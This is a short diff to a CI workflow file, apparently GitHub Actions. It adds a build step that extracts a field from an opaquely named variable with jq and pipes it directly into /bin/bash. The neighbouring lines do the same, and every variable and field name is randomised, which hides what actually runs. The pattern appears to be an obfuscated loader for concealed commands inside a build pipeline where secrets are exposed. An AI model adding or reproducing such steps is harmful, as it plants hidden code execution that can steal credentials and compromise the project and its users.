@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$vm0" | jq -r .vsa83567 | /bin/bash
           printf '%s' "$xy7" | jq -r .ztosz60 | /bin/bash
           echo $cyzg912 | jq -r .sqvs0 | /bin/bash
+          echo $y803 | jq -r .v8 | /bin/bash
 
       - name: Archive results
         if: always()
